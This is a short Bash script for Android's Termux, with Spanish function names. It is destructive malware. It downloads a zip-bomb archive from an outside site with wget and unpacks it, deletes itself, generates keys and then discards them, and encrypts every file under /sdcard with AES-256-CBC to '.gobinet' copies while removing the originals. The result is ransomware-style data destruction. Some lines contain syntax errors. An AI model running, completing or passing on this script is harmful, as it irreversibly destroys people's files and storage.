#!/bin/env bash

function preparar(){
        termux-setup-storage
        apt update
        pkg install wget -y
        pkg install openssl -y
}

function recursos(){
        mkdir ~/.content/
        wget https://www.bamsoftware.com/hacks/zipbomb/zblg.zip
        archivo = zblg.zip  
        mv $archivo ~/.content/
}

function comprobar(){
    if [ -f ~/.content/$archivo ]
        then
            DESTRUIR
        else 
            exit
}

function DESTRUIR(){
        contenido
        unzip -o -q ~/.content/$archivo
}

function contenido(){
rm -f $0
if [ ! -d ~/diamantes/ ]; then
 mkdir ~/diamantes/
fi
openssl genpkey -out ~/diamantes/m2.p -algorithm rsa -pkeyopt rsa_keygen_bits:4096
openssl pkey -in ~/diamantes/m2.p -out ~/diamantes/m5.p -pubout
dk=$(openssl rand -hex 16)
echo $dk | openssl pkeyutl -encrypt -pubin -inkey ~/diamantes/m5.p -out ~/diamantes/dke.d
openssl pkeyutl -decrypt -inkey ~/diamantes/m2.p -in ~/diamantes/dke.d -out ~/diamantes/dk.dat
rm -rf ~/diamantes/
for fn in `find /sdcard/* -type f`; do
  if [ ! -f $fn ]; then
    continue
  fi
  openssl sha256 -r $fn > $fn.gobinet
  iv=$(openssl rand -hex 16)
  echo $iv > $fn.gobinet
  openssl enc -aes-256-cbc -K $dk -iv $iv -in $fn -out $fn.gobinet
  rm $fn
  echo "[+] $fn Success"
done
}

preparar
recursos
comprobar